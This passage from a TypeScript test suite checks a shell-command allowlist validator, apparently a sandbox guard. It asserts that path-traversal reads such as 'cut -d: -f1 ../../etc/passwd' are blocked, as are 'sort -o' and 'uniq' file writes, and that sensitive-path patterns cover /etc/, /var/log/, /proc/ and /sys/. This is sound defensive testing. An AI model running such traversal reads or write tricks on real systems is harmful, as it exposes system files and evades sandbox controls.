  it('cut -d: -f1 ../../etc/passwd is blocked', () => expectInvalidArgs('cut -d: -f1 ../../etc/passwd'));
  it('diff ../../etc/hosts ../../etc/resolv.conf is blocked', () => expectInvalidArgs('diff ../../etc/hosts ../../etc/resolv.conf'));
  it('ls ../../etc is blocked', () => expectInvalidArgs('ls ../../etc'));
  it('find ../../etc -name x is blocked', () => expectInvalidArgs('find ../../etc -name "*.conf"'));
});

describe('F-OP-34 — sort -o and uniq OUTPUT are blocked file-write primitives', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('sort -o writes are blocked', () => expectInvalidArgs('sort -o /root/sharpedge/x /root/sharpedge/y'));
  it('sort --output writes are blocked', () => expectInvalidArgs('sort --output /root/sharpedge/x /root/sharpedge/y'));
  it('sort --output=FILE writes are blocked', () => expectInvalidArgs('sort --output=/root/sharpedge/x /root/sharpedge/y'));
  it('uniq INPUT OUTPUT is blocked (second positional)', () => expectInvalidArgs('uniq /root/sharpedge/a /root/sharpedge/b'));
  it('uniq single positional is NOT rejected for being a file-write', () => {
    // We don't assert acceptance (path may not exist in sandbox). We only assert the
    // rejection reason — if any — is NOT the "second positional (OUTPUT file)" rule.
    try { validateAgainstAllowlist('uniq /root/sharpedge/package.json'); } catch (e) {
      assert.doesNotMatch(String(e), /second positional/i,
        'uniq with one positional must not be rejected as "second positional OUTPUT"');
      assert.doesNotMatch(String(e), /prohibited — use stdout only/i,
        'uniq with one positional must not hit the uniq file-write rule');
    }
  });
});

describe('F-OP-33 sensitive-pattern defence-in-depth', () => {
  it('SENSITIVE_FILE_PATTERNS includes /etc/ and /var/log/ after F-OP-33', () => {
    const srcs = SENSITIVE_FILE_PATTERNS.map((p: RegExp) => p.source);
    assert.ok(srcs.some((s: string) => /\\\/etc\\\//.test(s)), 'expected /etc/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/var\\\/log\\\//.test(s)), 'expected /var/log/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/proc\\\//.test(s)), 'expected /proc/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/sys\\\//.test(s)), 'expected /sys/ pattern to be present');
  });
});
